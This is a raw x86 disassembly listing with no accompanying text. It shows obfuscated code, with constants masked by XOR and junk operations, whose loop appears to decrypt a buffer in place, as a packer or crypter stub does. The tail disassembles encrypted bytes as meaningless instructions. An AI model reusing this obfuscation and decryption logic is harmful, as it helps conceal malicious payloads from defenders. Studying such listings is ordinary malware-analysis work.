  4159f6:	adc    DWORD PTR ds:0x43774f,eax
  4159fc:	mov    eax,DWORD PTR [ebp+0xc]
  4159ff:	or     DWORD PTR ds:0x4377a7,0x409b
  415a09:	xor    eax,0x75108b5
  415a0e:	or     DWORD PTR ds:0x437763,0x48d4
  415a18:	add    eax,0x3272fb
  415a1d:	xor    DWORD PTR ds:0x437737,0x4377bb
  415a27:	push   eax
  415a28:	mov    DWORD PTR ds:0x43770f,0x1d
  415a32:	cmp    DWORD PTR ds:0x43770f,0x0
  415a39:	je     0x415a79
  415a3f:	cmp    DWORD PTR ds:0x43770f,0x22
  415a46:	jle    0x415a79
  415a4c:	jmp    0x415a69
  415a51:	push   0x5a7a
  415a56:	push   DWORD PTR [ebp-0xc]
  415a59:	push   0x437773
  415a5e:	push   0x43774b
  415a63:	call   DWORD PTR ds:0x43ca0c
  415a69:	mov    eax,ds:0x43770f
  415a6e:	dec    eax
  415a6f:	mov    ds:0x43770f,eax
  415a74:	jmp    0x415a32
  415a79:	push   0x437315
  415a7e:	mov    eax,ds:0x4373bf
  415a83:	adc    DWORD PTR ds:0x43779f,0x43778f
  415a8d:	push   DWORD PTR [eax]
  415a8f:	sbb    DWORD PTR ds:0x43771b,0x437783
  415a99:	call   0x40d347
  415a9e:	mov    eax,DWORD PTR [ebp-0x24]
  415aa1:	or     DWORD PTR ds:0x43776f,0x10e2
  415aab:	mov    DWORD PTR [ebp-0x8],eax
  415aae:	mov    eax,DWORD PTR [ebp-0x4]
  415ab1:	add    DWORD PTR ds:0x437753,0x43776f
  415abb:	mov    DWORD PTR [ebp-0x2c],eax
  415abe:	sub    DWORD PTR ds:0x43776f,ebx
  415ac4:	mov    eax,DWORD PTR [ebp-0x8]
  415ac7:	sub    eax,0x3272fb
  415acc:	xor    eax,0x75108b5
  415ad1:	cmp    eax,0xf89c85b0
  415ad6:	jne    0x415ae9
  415adc:	dec    DWORD PTR ds:0x4377af
  415ae2:	xor    eax,eax
  415ae4:	jmp    0x42d445
  415ae9:	xor    eax,eax
  415aeb:	add    eax,DWORD PTR ds:0x43774f
  415af1:	and    DWORD PTR ds:0x43775f,eax
  415af7:	mov    eax,DWORD PTR [ebp-0x2c]
  415afa:	and    DWORD PTR ds:0x437717,0x0
  415b04:	jmp    0x415b16
  415b09:	mov    ecx,DWORD PTR ds:0x437717
  415b0f:	inc    ecx
  415b10:	mov    DWORD PTR ds:0x437717,ecx
  415b16:	cmp    DWORD PTR ds:0x437717,0x10
  415b1d:	jae    0x415b70
  415b23:	cmp    DWORD PTR ds:0x437717,0x6
  415b2a:	jle    0x415b70
  415b30:	jmp    0x415b51
  415b35:	push   DWORD PTR [ebp-0xc]
  415b38:	push   0x437042
  415b3d:	push   DWORD PTR [ebp-0x14]
  415b40:	push   0x4370f4
  415b45:	push   DWORD PTR [ebp-0x20]
  415b48:	push   DWORD PTR [ebp-0x20]
  415b4b:	call   DWORD PTR ds:0x43ca10
  415b51:	cmp    DWORD PTR ds:0x437717,0x5
  415b58:	jne    0x415b6b
  415b5e:	mov    ecx,DWORD PTR ds:0x437717
  415b64:	inc    ecx
  415b65:	mov    DWORD PTR ds:0x437717,ecx
  415b6b:	jmp    0x415b09
  415b70:	mov    DWORD PTR [ebp-0xc4],eax
  415b76:	mov    DWORD PTR [ebp-0x98],0xf89c8527
  415b80:	mov    DWORD PTR [ebp-0x90],0xf89c85bd
  415b8a:	and    DWORD PTR ds:0x43777b,0x0
  415b94:	jmp    0x415ba6
  415b99:	mov    ecx,DWORD PTR ds:0x43777b
  415b9f:	inc    ecx
  415ba0:	mov    DWORD PTR ds:0x43777b,ecx
  415ba6:	cmp    DWORD PTR ds:0x43777b,0x18
  415bad:	jae    0x415bda
  415bb3:	cmp    DWORD PTR ds:0x43777b,0x20
  415bba:	jb     0x415bda
  415bc0:	jmp    0x415bd5
  415bc5:	push   0x4b28
  415bca:	push   0x437737
  415bcf:	call   DWORD PTR ds:0x43c960
  415bd5:	jmp    0x415b99
  415bda:	mov    DWORD PTR [ebp-0xa0],0xf89c85b0
  415be4:	mov    DWORD PTR [ebp-0xa4],0xf89c85b3
  415bee:	mov    DWORD PTR [ebp-0x8c],0xf89c85b2
  415bf8:	or     DWORD PTR ds:0x43773f,edi
  415bfe:	mov    eax,DWORD PTR [ebp-0xa4]
  415c04:	mov    ecx,DWORD PTR ds:0x4377d3
  415c0a:	mov    ecx,DWORD PTR [ecx]
  415c0c:	sbb    DWORD PTR ds:0x437767,ecx
  415c12:	xor    eax,0x75108b5
  415c17:	add    DWORD PTR ds:0x4377a7,0x2ea0
  415c21:	add    eax,0x3272fb
  415c26:	mov    ecx,DWORD PTR ds:0x43779f
  415c2c:	sub    DWORD PTR ds:0x437743,ecx
  415c32:	mov    ecx,DWORD PTR [ebp-0xc4]
  415c38:	sub    ecx,eax
  415c3a:	mov    DWORD PTR ds:0x437767,0x6669
  415c44:	mov    DWORD PTR [ebp-0x94],ecx
  415c4a:	mov    DWORD PTR [ebp-0x9c],0xf89c85bf
  415c54:	mov    DWORD PTR ds:0x4377b3,0x3984
  415c5e:	cmp    DWORD PTR [ebp-0x8c],0xf89c85b0
  415c68:	mov    DWORD PTR ds:0x437797,0x4ae3
  415c72:	je     0x416422
  415c78:	mov    eax,DWORD PTR [ebp-0xa4]
  415c7e:	neg    ecx
  415c80:	xor    eax,0x75108b5
  415c85:	mov    ecx,DWORD PTR [ebp-0xa4]
  415c8b:	xor    ecx,0x75108b5
  415c91:	adc    DWORD PTR ds:0x4377a7,0x380b
  415c9b:	lea    ecx,[eax+ecx*1+0x64e5f6]
  415ca2:	mov    eax,DWORD PTR [ebp-0x94]
  415ca8:	xor    edx,edx
  415caa:	div    ecx
  415cac:	mov    eax,DWORD PTR [ebp-0x8c]
  415cb2:	add    DWORD PTR ds:0x43774b,ebx
  415cb8:	xor    eax,0x75108b5
  415cbd:	and    DWORD PTR ds:0x437713,0x450a
  415cc7:	add    eax,0x3272fb
  415ccc:	mov    ecx,DWORD PTR [ebp-0xa4]
  415cd2:	xor    ecx,0x75108b5
  415cd8:	add    ecx,0x3272fb
  415cde:	and    DWORD PTR ds:0x437773,0x437743
  415ce8:	sub    eax,ecx
  415cea:	cmp    edx,eax
  415cec:	jne    0x4160ed
  415cf2:	sbb    eax,0x28b5
  415cf7:	mov    eax,DWORD PTR [ebp-0x8]
  415cfa:	xor    DWORD PTR ds:0x43774f,0x2b4e
  415d04:	add    eax,DWORD PTR [ebp-0x94]
  415d0a:	sbb    DWORD PTR ds:0x4377b7,0x43775f
  415d14:	mov    al,BYTE PTR [eax]
  415d16:	mov    BYTE PTR [ebp-0xb9],al
  415d1c:	sub    DWORD PTR ds:0x43771f,ebx
  415d22:	mov    eax,DWORD PTR [ebp-0xa0]
  415d28:	or     DWORD PTR ds:0x4377a3,0x437787
  415d32:	xor    eax,0x75108b5
  415d37:	add    eax,0x3272fb
  415d3c:	mov    DWORD PTR ds:0x43770f,0x2af0
  415d46:	mov    DWORD PTR [ebp-0xc0],eax
  415d4c:	mov    DWORD PTR ds:0x437777,0x3812
  415d56:	jmp    0x415d7c
  415d5b:	sbb    DWORD PTR ds:0x437727,0x43779f
  415d65:	mov    eax,DWORD PTR [ebp-0xc0]
  415d6b:	and    DWORD PTR ds:0x437717,0x4377b3
  415d75:	inc    eax
  415d76:	mov    DWORD PTR [ebp-0xc0],eax
  415d7c:	sub    eax,0x6bb3
  415d81:	mov    eax,DWORD PTR [ebp-0x9c]
  415d87:	add    DWORD PTR ds:0x43774f,0x4377bb
  415d91:	xor    eax,0x75108b5
  415d96:	xor    DWORD PTR ds:0x437777,0x2bbf
  415da0:	add    eax,0x3272fb
  415da5:	mov    DWORD PTR ds:0x437737,0x7b12
  415daf:	cmp    DWORD PTR [ebp-0xc0],eax
  415db5:	jae    0x415f32
  415dbb:	inc    ecx
  415dbc:	mov    eax,DWORD PTR [ebp-0xc0]
  415dc2:	sub    eax,0x3272fb
  415dc7:	add    DWORD PTR ds:0x43778f,0x4ea7
  415dd1:	xor    eax,0x75108b5
  415dd6:	or     ecx,DWORD PTR ds:0x43772f
  415ddc:	add    eax,0x7f55d8f2
  415de1:	mov    ecx,0x39f3
  415de6:	mov    ecx,DWORD PTR [ebp-0xc0]
  415dec:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415df3:	mov    DWORD PTR ds:0x43774b,edx
  415df9:	mov    eax,DWORD PTR [ebp-0xc0]
  415dff:	cmp    DWORD PTR [ebp+eax*4-0xb8],0x244ecb9d
  415e0a:	mov    DWORD PTR ds:0x437753,0x65ed
  415e14:	jbe    0x415e94
  415e1a:	mov    DWORD PTR ds:0x437763,0xe32
  415e24:	mov    eax,DWORD PTR [ebp-0xc0]
  415e2a:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415e31:	and    DWORD PTR ds:0x43773f,0x0
  415e3b:	mov    ecx,DWORD PTR ds:0x43773f
  415e41:	inc    ecx
  415e42:	mov    DWORD PTR ds:0x43773f,ecx
  415e48:	cmp    DWORD PTR ds:0x43773f,0x2b
  415e4f:	jbe    0x415e77
  415e55:	jmp    0x415e6a
  415e5a:	push   0x437094
  415e5f:	push   0x437094
  415e64:	call   DWORD PTR ds:0x43c964
  415e6a:	cmp    DWORD PTR ds:0x43773f,0x1e
  415e71:	jb     0x415e3b
  415e77:	add    eax,0x405fcdc
  415e7c:	mov    ecx,DWORD PTR ds:0x4377a7
  415e82:	mov    ecx,DWORD PTR [ebp-0xc0]
  415e88:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415e8f:	jmp    0x415f23
  415e94:	and    ecx,DWORD PTR ds:0x43775b
  415e9a:	mov    eax,DWORD PTR [ebp-0xc0]
  415ea0:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415ea7:	and    DWORD PTR ds:0x4377bb,0x0
  415eb1:	jmp    0x415ec3
  415eb6:	mov    ecx,DWORD PTR ds:0x4377bb
  415ebc:	inc    ecx
  415ebd:	mov    DWORD PTR ds:0x4377bb,ecx
  415ec3:	cmp    DWORD PTR ds:0x4377bb,0x1b
  415eca:	jae    0x415f0c
  415ed0:	cmp    DWORD PTR ds:0x4377bb,0x5
  415ed7:	ja     0x415f0c
  415edd:	jmp    0x415eed
  415ee2:	push   0x4370a4
  415ee7:	call   DWORD PTR ds:0x43c968
  415eed:	cmp    DWORD PTR ds:0x4377bb,0x4
  415ef4:	jne    0x415f07
  415efa:	mov    ecx,DWORD PTR ds:0x4377bb
  415f00:	inc    ecx
  415f01:	mov    DWORD PTR ds:0x4377bb,ecx
  415f07:	jmp    0x415eb6
  415f0c:	sub    eax,0x250bcdc
  415f11:	mov    ecx,0x72b4
  415f16:	mov    ecx,DWORD PTR [ebp-0xc0]
  415f1c:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415f23:	mov    DWORD PTR ds:0x4377b7,0x3b3c
  415f2d:	jmp    0x415d5b
  415f32:	xor    eax,eax
  415f34:	mov    DWORD PTR ds:0x43779b,0x35fa
  415f3e:	jne    0x415f77
  415f44:	and    eax,0x5148
  415f49:	movzx  eax,BYTE PTR [ebp-0xb9]
  415f50:	xor    eax,0x83
  415f55:	sbb    DWORD PTR ds:0x437797,0x43771b
  415f5f:	add    eax,0x8
  415f62:	mov    DWORD PTR ds:0x4377ab,0x5d96
  415f6c:	mov    BYTE PTR [ebp-0xb9],al
  415f72:	jmp    0x4160c6
  415f77:	and    DWORD PTR ds:0x4377af,0x0
  415f81:	jmp    0x415f93
  415f86:	mov    ecx,DWORD PTR ds:0x4377af
  415f8c:	inc    ecx
  415f8d:	mov    DWORD PTR ds:0x4377af,ecx
  415f93:	cmp    DWORD PTR ds:0x4377af,0x1a
  415f9a:	jae    0x415fd5
  415fa0:	cmp    DWORD PTR ds:0x4377af,0x1e
  415fa7:	jl     0x415fd5
  415fad:	jmp    0x415fd0
  415fb2:	push   DWORD PTR [ebp-0x14]
  415fb5:	push   0x43772f
  415fba:	push   DWORD PTR [ebp-0x20]
  415fbd:	push   0x43716e
  415fc2:	push   DWORD PTR [ebp-0x28]
  415fc5:	push   0x6705
  415fca:	call   DWORD PTR ds:0x43c96c
  415fd0:	jmp    0x415f86
  415fd5:	mov    eax,DWORD PTR [ebp-0x98]
  415fdb:	and    DWORD PTR ds:0x437757,0x0
  415fe5:	jmp    0x415ff7
  415fea:	mov    ecx,DWORD PTR ds:0x437757
  415ff0:	inc    ecx
  415ff1:	mov    DWORD PTR ds:0x437757,ecx
  415ff7:	cmp    DWORD PTR ds:0x437757,0x1b
  415ffe:	jae    0x416043
  416004:	cmp    DWORD PTR ds:0x437757,0x9
  41600b:	jge    0x416043
  416011:	jmp    0x416024
  416016:	push   0x43770f
  41601b:	push   DWORD PTR [ebp-0x18]
  41601e:	call   DWORD PTR ds:0x43c970
  416024:	cmp    DWORD PTR ds:0x437757,0x8
  41602b:	jne    0x41603e
  416031:	mov    ecx,DWORD PTR ds:0x437757
  416037:	inc    ecx
  416038:	mov    DWORD PTR ds:0x437757,ecx
  41603e:	jmp    0x415fea
  416043:	xor    eax,0x75108b5
  416048:	mov    ecx,DWORD PTR ds:0x437743
  41604e:	add    DWORD PTR ds:0x4377b7,ecx
  416054:	add    eax,0x3272fb
  416059:	mov    ecx,DWORD PTR ds:0x437727
  41605f:	add    DWORD PTR ds:0x43771f,ecx
  416065:	movzx  ecx,BYTE PTR [ebp-0xb9]
  41606c:	sub    ecx,eax
  41606e:	mov    BYTE PTR [ebp-0xb9],cl
  416074:	adc    DWORD PTR ds:0x43779f,0x43771f
  41607e:	mov    ecx,DWORD PTR [ebp-0x90]
  416084:	xor    DWORD PTR ds:0x43773f,0x437753
  41608e:	xor    ecx,0x75108b5
  416094:	adc    DWORD PTR ds:0x437727,0x43774f
  41609e:	add    ecx,0x3272fb
  4160a4:	mov    al,BYTE PTR [ebp-0xb9]
  4160aa:	and    DWORD PTR ds:0x43771f,0x6ab7
  4160b4:	ror    al,cl
  4160b6:	sub    DWORD PTR ds:0x43770f,0x1214
  4160c0:	mov    BYTE PTR [ebp-0xb9],al
  4160c6:	sub    DWORD PTR ds:0x43778f,0x437757
  4160d0:	xor    eax,eax
  4160d2:	mov    eax,DWORD PTR [ebp-0x8]
  4160d5:	add    eax,DWORD PTR [ebp-0x94]
  4160db:	or     DWORD PTR ds:0x437717,0x5827
  4160e5:	mov    cl,BYTE PTR [ebp-0xb9]
  4160eb:	mov    BYTE PTR [eax],cl
  4160ed:	mov    eax,DWORD PTR [ebp-0x94]
  4160f3:	sub    DWORD PTR ds:0x43771b,0x437777
  4160fd:	sub    eax,0x3272fb
  416102:	sub    DWORD PTR ds:0x437777,0x76d0
  41610c:	xor    eax,0x75108b5
  416111:	mov    DWORD PTR ds:0x43773f,0x3e21
  41611b:	cmp    eax,DWORD PTR [ebp-0xa0]
  416121:	mov    DWORD PTR ds:0x437797,0x79e9
  41612b:	jne    0x416341
  416131:	mov    eax,DWORD PTR [ebp-0x8c]
  416137:	xor    eax,0x75108b5
  41613c:	add    eax,0x3272fb
  416141:	mov    ecx,DWORD PTR ds:0x43771b
  416147:	adc    DWORD PTR ds:0x43772f,ecx
  41614d:	mov    ecx,DWORD PTR [ebp-0xa4]
  416153:	and    DWORD PTR ds:0x43779b,0x4377bb
  41615d:	xor    ecx,0x75108b5
  416163:	add    ecx,0x3272fb
  416169:	sub    eax,ecx
  41616b:	and    DWORD PTR ds:0x437793,0x0
  416175:	mov    ecx,DWORD PTR ds:0x437793
  41617b:	inc    ecx
  41617c:	mov    DWORD PTR ds:0x437793,ecx
  416182:	cmp    DWORD PTR ds:0x437793,0x2b
  416189:	jbe    0x4161c3
  41618f:	jmp    0x4161b6
  416194:	push   0x170b
  416199:	push   0x43772f
  41619e:	push   DWORD PTR [ebp-0x1c]
  4161a1:	push   0x437061
  4161a6:	push   0x5827
  4161ab:	push   0x27a3
  4161b0:	call   DWORD PTR ds:0x43c978
  4161b6:	cmp    DWORD PTR ds:0x437793,0x1d
  4161bd:	jb     0x416175
  4161c3:	sub    eax,0x3272fb
  4161c8:	xor    eax,0x75108b5
  4161cd:	and    DWORD PTR ds:0x437713,0x0
  4161d7:	mov    ecx,DWORD PTR ds:0x437713
  4161dd:	inc    ecx
  4161de:	mov    DWORD PTR ds:0x437713,ecx
  4161e4:	cmp    DWORD PTR ds:0x437713,0x9
  4161eb:	jle    0x41623d
  4161f1:	jmp    0x416216
  4161f6:	push   0x437094
  4161fb:	push   DWORD PTR [ebp-0x14]
  4161fe:	push   0x6d50
  416203:	push   0x1b74
  416208:	push   DWORD PTR [ebp-0x18]
  41620b:	push   0x79a3
  416210:	call   DWORD PTR ds:0x43c97c
  416216:	cmp    DWORD PTR ds:0x437713,0x8
  41621d:	jne    0x416230
  416223:	mov    ecx,DWORD PTR ds:0x437713
  416229:	inc    ecx
  41622a:	mov    DWORD PTR ds:0x437713,ecx
  416230:	cmp    DWORD PTR ds:0x437713,0x19
  416237:	jb     0x4161d7
  41623d:	mov    DWORD PTR [ebp-0x8c],eax
  416243:	mov    eax,DWORD PTR [ebp-0xa4]
  416249:	and    DWORD PTR ds:0x43777f,0x0
  416253:	mov    ecx,DWORD PTR ds:0x43777f
  416259:	inc    ecx
  41625a:	mov    DWORD PTR ds:0x43777f,ecx
  416260:	cmp    DWORD PTR ds:0x43777f,0x10
  416267:	jb     0x4162ac
  41626d:	jmp    0x416285
  416272:	push   0x437042
  416277:	push   0x437089
  41627c:	push   DWORD PTR [ebp-0x24]
  41627f:	call   DWORD PTR ds:0x43c980
  416285:	cmp    DWORD PTR ds:0x43777f,0xf
  41628c:	jne    0x41629f
  416292:	mov    ecx,DWORD PTR ds:0x43777f
  416298:	inc    ecx
  416299:	mov    DWORD PTR ds:0x43777f,ecx
  41629f:	cmp    DWORD PTR ds:0x43777f,0x1f
  4162a6:	jb     0x416253
  4162ac:	xor    eax,0x75108b5
  4162b1:	mov    DWORD PTR ds:0x43779f,0x13
  4162bb:	cmp    DWORD PTR ds:0x43779f,0x0
  4162c2:	je     0x416323
  4162c8:	cmp    DWORD PTR ds:0x43779f,0x4
  4162cf:	jg     0x416323
  4162d5:	jmp    0x4162f5
  4162da:	push   0x664a
  4162df:	push   DWORD PTR [ebp-0x28]
  4162e2:	push   DWORD PTR [ebp-0xc]
  4162e5:	push   0x1a11
  4162ea:	push   0x533a
  4162ef:	call   DWORD PTR ds:0x43c984
  4162f5:	cmp    DWORD PTR ds:0x43779f,0x5
  4162fc:	jne    0x416311
  416302:	xor    ecx,ecx
  416304:	add    ecx,DWORD PTR ds:0x43779f
  41630a:	dec    ecx
  41630b:	mov    DWORD PTR ds:0x43779f,ecx
  416311:	mov    ecx,DWORD PTR ds:0x43779f
  416317:	dec    ecx
  416318:	mov    DWORD PTR ds:0x43779f,ecx
  41631e:	jmp    0x4162bb
  416323:	add    eax,0x3272fb
  416328:	sbb    ecx,DWORD PTR ds:0x437713
  41632e:	mov    ecx,DWORD PTR [ebp-0xc4]
  416334:	sub    ecx,eax
  416336:	mov    DWORD PTR [ebp-0x94],ecx
  41633c:	jmp    0x41641d
  416341:	mov    DWORD PTR ds:0x43774b,0x19
  41634b:	cmp    DWORD PTR ds:0x43774b,0x0
  416352:	je     0x416387
  416358:	cmp    DWORD PTR ds:0x43774b,0x1e
  41635f:	ja     0x416387
  416365:	jmp    0x416373
  41636a:	push   DWORD PTR [ebp-0x18]
  41636d:	call   DWORD PTR ds:0x43c988
  416373:	xor    ecx,ecx
  416375:	add    ecx,DWORD PTR ds:0x43774b
  41637b:	dec    ecx
  41637c:	mov    DWORD PTR ds:0x43774b,ecx
  416382:	jmp    0x41634b
  416387:	mov    eax,DWORD PTR [ebp-0xa4]
  41638d:	and    ecx,DWORD PTR ds:0x437743
  416393:	xor    eax,0x75108b5
  416398:	and    DWORD PTR ds:0x4377af,0x0
  4163a2:	jmp    0x4163b4
  4163a7:	mov    ecx,DWORD PTR ds:0x4377af
  4163ad:	inc    ecx
  4163ae:	mov    DWORD PTR ds:0x4377af,ecx
  4163b4:	cmp    DWORD PTR ds:0x4377af,0x13
  4163bb:	jae    0x416400
  4163c1:	cmp    DWORD PTR ds:0x4377af,0x8
  4163c8:	jb     0x416400
  4163ce:	jmp    0x4163e1
  4163d3:	push   0x3598
  4163d8:	push   DWORD PTR [ebp-0x1c]
  4163db:	call   DWORD PTR ds:0x43c98c
  4163e1:	cmp    DWORD PTR ds:0x4377af,0x7
  4163e8:	jne    0x4163fb
  4163ee:	mov    ecx,DWORD PTR ds:0x4377af
  4163f4:	inc    ecx
  4163f5:	mov    DWORD PTR ds:0x4377af,ecx
  4163fb:	jmp    0x4163a7
  416400:	add    eax,0x3272fb
  416405:	mov    ecx,DWORD PTR [ebp-0x94]
  41640b:	sub    ecx,eax
  41640d:	mov    DWORD PTR ds:0x437753,0x2d68
  416417:	mov    DWORD PTR [ebp-0x94],ecx
  41641d:	jmp    0x415c54
  416422:	mov    eax,DWORD PTR [ebp-0x2c]
  416425:	mov    DWORD PTR ds:0x437763,0x1dfd
  41642f:	mov    DWORD PTR [ebp-0x100],eax
  416435:	or     DWORD PTR ds:0x437777,0x29f8
  41643f:	mov    DWORD PTR [ebp-0xd4],0xf89c8527
  416449:	mov    DWORD PTR [ebp-0xcc],0xf89c85bd
  416453:	mov    DWORD PTR [ebp-0xdc],0xf89c85b0
  41645d:	mov    eax,ds:0x43778f
  416462:	and    DWORD PTR ds:0x43776f,eax
  416468:	mov    DWORD PTR [ebp-0xe0],0xf89c85b3
  416472:	mov    DWORD PTR [ebp-0xc8],0xf89c85b2
  41647c:	mov    DWORD PTR ds:0x43776b,0x16
  416486:	cmp    DWORD PTR ds:0x43776b,0x0
  41648d:	je     0x4164e1
  416493:	cmp    DWORD PTR ds:0x43776b,0xa
  41649a:	jg     0x4164e1
  4164a0:	jmp    0x4164b5
  4164a5:	push   0x437797
  4164aa:	push   0x167f
  4164af:	call   DWORD PTR ds:0x43c990
  4164b5:	cmp    DWORD PTR ds:0x43776b,0xb
  4164bc:	jne    0x4164cf
  4164c2:	mov    ecx,DWORD PTR ds:0x43776b
  4164c8:	dec    ecx
  4164c9:	mov    DWORD PTR ds:0x43776b,ecx
  4164cf:	mov    ecx,DWORD PTR ds:0x43776b
  4164d5:	dec    ecx
  4164d6:	mov    DWORD PTR ds:0x43776b,ecx
  4164dc:	jmp    0x416486
  4164e1:	mov    eax,DWORD PTR [ebp-0xe0]
  4164e7:	xor    eax,0x75108b5
  4164ec:	xor    ecx,ecx
  4164ee:	xor    ecx,DWORD PTR ds:0x437713
  4164f4:	sbb    ecx,DWORD PTR ds:0x43774b
  4164fa:	mov    DWORD PTR ds:0x437713,ecx
  416500:	add    eax,0x3272fb
  416505:	mov    ecx,DWORD PTR [ebp-0x100]
  41650b:	and    DWORD PTR ds:0x437753,0x43772b
  416515:	sub    ecx,eax
  416517:	mov    DWORD PTR [ebp-0xd0],ecx
  41651d:	mov    DWORD PTR ds:0x43779f,0x77e5
  416527:	mov    DWORD PTR [ebp-0xd8],0xf89c85bf
  416531:	mov    DWORD PTR ds:0x4377bb,0x62a5
  41653b:	cmp    DWORD PTR [ebp-0xc8],0xf89c85b0
  416545:	mov    DWORD PTR ds:0x4377b7,0x2244
  41654f:	je     0x418baf
  416555:	mov    eax,DWORD PTR [ebp-0xe0]
  41655b:	xor    DWORD PTR ds:0x43775b,edx
  416561:	xor    eax,0x75108b5
  416566:	mov    ecx,DWORD PTR [ebp-0xe0]
  41656c:	sub    DWORD PTR ds:0x437747,0x6975
  416576:	xor    ecx,0x75108b5
  41657c:	lea    ecx,[eax+ecx*1+0x64e5f6]
  416583:	mov    eax,DWORD PTR [ebp-0xd0]
  416589:	adc    DWORD PTR ds:0x437723,0x43771b
  416593:	xor    edx,edx
  416595:	sub    DWORD PTR ds:0x437773,0x43778b
  41659f:	div    ecx
  4165a1:	and    DWORD PTR ds:0x437757,0x0
  4165ab:	jmp    0x4165bf
  4165b0:	xor    ecx,ecx
  4165b2:	xor    ecx,DWORD PTR ds:0x437757
  4165b8:	inc    ecx
  4165b9:	mov    DWORD PTR ds:0x437757,ecx
  4165bf:	cmp    DWORD PTR ds:0x437757,0x12
  4165c6:	jae    0x4165fc
  4165cc:	cmp    DWORD PTR ds:0x437757,0x14
  4165d3:	jg     0x4165fc
  4165d9:	jmp    0x4165f7
  4165de:	push   DWORD PTR [ebp-0x24]
  4165e1:	push   DWORD PTR [ebp-0x28]
  4165e4:	push   0x437094
  4165e9:	push   0x437061
  4165ee:	push   DWORD PTR [ebp-0x24]
  4165f1:	call   DWORD PTR ds:0x43c994
  4165f7:	jmp    0x4165b0
  4165fc:	mov    eax,DWORD PTR [ebp-0xc8]
  416602:	xor    eax,0x75108b5
  416607:	add    eax,0x3272fb
  41660c:	mov    ecx,DWORD PTR [ebp-0xe0]
  416612:	xor    ecx,0x75108b5
  416618:	add    ecx,0x3272fb
  41661e:	jmp    0x4189c4
  416623:	test   eax,0x60a2e213
  416628:	jb     0x416613
  41662a:	adc    dh,ah
  41662c:	or     BYTE PTR ds:[edi-0x6ff2a266],0xb2
  416634:	xchg   ecx,eax
  416635:	jp     0x4166b2
  416637:	add    bl,BYTE PTR [eax+0x2d77b7b]
  41663d:	leave  
  41663e:	out    0x6,eax
  416640:	add    al,al
  416642:	leave  
  416643:	in     al,0xa5
  416645:	loope  0x416631
  416647:	mov    bl,0xe2
  416649:	cmc    
  41664a:	cli    
  41664b:	mov    edx,0xcfd0d9b8
  416650:	hlt    
  416651:	loop   0x416647
  416653:	loope  0x416612
  416655:	cmc    
  416656:	rol    BYTE PTR [ecx],0xf4
  416659:	cli    
  41665a:	(bad)  
  41665b:	retf   0xf9d6
  41665e:	fdiv   st,st(3)
  416660:	out    0xdc,al
  416662:	lods   al,BYTE PTR ds:[esi]
  416663:	into   
  416664:	test   eax,0xe0fbcaf3
  416669:	enter  0xe9f9,0xc5
  41666d:	mov    al,0xb8
  41666f:	mov    edi,0xfcc2cff3
  416674:	in     al,dx
  416675:	repnz stc 
  416677:	repnz (bad) 
  41667a:	shl    esp,1
  41667c:	(bad)  
  41667e:	cld    
  41667f:	loopne 0x416685
  416681:	leave  
  416682:	iret   
  416683:	icebp  
  416684:	ror    bh,1
  416686:	div    BYTE PTR [ebp-0x184b081d]
  41668c:	out    0xbb,al
  41668e:	fprem  
  416690:	cli    
  416691:	loope  0x416670
  416693:	ret    
  416694:	loope  0x416696
  416696:	lock or edx,ebp
  416699:	lock std 
  41669b:	cld    
  41669c:	stc    
  41669d:	cld    
  41669e:	add    edi,edi
  4166a0:	out    0xf1,eax
  4166a2:	scas   al,BYTE PTR es:[edi]
  4166a3:	jmp    0xfbb6:0xd4ccbda8
  4166aa:	clc    
  4166ab:	shl    DWORD PTR [edi-0x14004628],1
  4166b1:	rcl    esp,1
  4166b3:	mov    ebp,0x4d4e302
  4166b8:	repz in al,0xc3
  4166bb:	shl    ah,1
  4166bd:	add    dh,bl
  4166bf:	(bad)  
  4166c1:	retf   
  4166c2:	mov    edi,0xb6d6ddc2
  4166c7:	out    dx,eax
  4166c8:	div    DWORD PTR [ecx-0x1b28303c]
  4166ce:	mov    ah,0xcb
  4166d0:	in     eax,dx
  4166d1:	hlt    
  4166d2:	out    dx,eax
  4166d3:	mov    ebp,0xd4e3f8f1
  4166d8:	shl    esi,0xc7
  4166db:	clc    
  4166dc:	hlt    
  4166dd:	jmp    0x4166a6
  4166df:	jmp    0xd80979ae
  4166e4:	mov    edi,0xe7e6ccca
  4166e9:	sti    
  4166ea:	mov    bl,0xba
  4166ec:	repz std 
  4166ee:	leave  
  4166ef:	aam    0xeb
  4166f1:	icebp  
  4166f2:	fldz   
  4166f4:	rcr    al,1
  4166f6:	repnz add ebp,ebx
  4166f9:	fadd   QWORD PTR [ebx]
  4166fb:	shl    edi,0xfd
  4166fe:	(bad)  
  4166ff:	loop   0x4166e6
  416701:	retf   0xcfaa
  416704:	out    0xcc,eax
  416706:	in     al,dx
  416707:	out    dx,al
  416708:	ret    
  416709:	lods   al,BYTE PTR ds:[esi]
  41670a:	enter  0xd6d1,0xb6
  41670e:	(bad)  
  416710:	mov    ch,0xde
  416712:	loopne 0x4166d3
  416714:	loopne 0x4166dc
  416716:	sar    DWORD PTR [esi-0xf143900],1
  41671c:	push   es
  41671d:	loopne 0x416701
  41671f:	std    
  416720:	jecxz  0x4166eb
  416722:	scas   eax,DWORD PTR es:[edi]
  416723:	xlat   BYTE PTR ds:[ebx]
  416724:	(bad)  
  416725:	ror    cl,cl
  416727:	shl    edi,1
  416729:	mov    dh,0xb2
  41672b:	out    dx,al
  41672c:	cli    
  41672d:	xlat   BYTE PTR ds:[ebx]
  41672e:	mov    eax,0xd5f5edbd
  416733:	into   
  416734:	mov    ecx,0xf2f5f8bc
  416739:	(bad)
  41673c:	jmp    0x416748
  41673e:	in     al,dx
  41673f:	in     al,0xdd
  416741:	fdivr  QWORD PTR [esi-0x1f1c533d]
  416747:	shl    bl,1
  416749:	out    0xd7,eax
  41674b:	mov    al,0xd6
  41674d:	rcl    edx,cl
  41674f:	(bad)  
  416751:	repz fcom st(4)
  416754:	mov    edi,0xe1e1fbd8
  416759:	fcmovnu st,st(5)
  41675b:	clc    
  41675c:	aam    0xf5
  41675e:	out    0xa,eax
  416760:	(bad)  
  416763:	call   0xd702154a
  416768:	rcl    eax,cl
  41676a:	in     eax,dx
  41676b:	sar    cl,cl
  41676d:	mov    dh,0xdd
  41676f:	std    
  416770:	iret   
  416771:	out    dx,al
  416772:	fcomi  st,st(3)
  416774:	xlat   BYTE PTR ds:[ebx]
  416775:	mov    ah,0xfc
  416777:	add    al,0xc5
  416779:	dec    DWORD PTR [ecx]
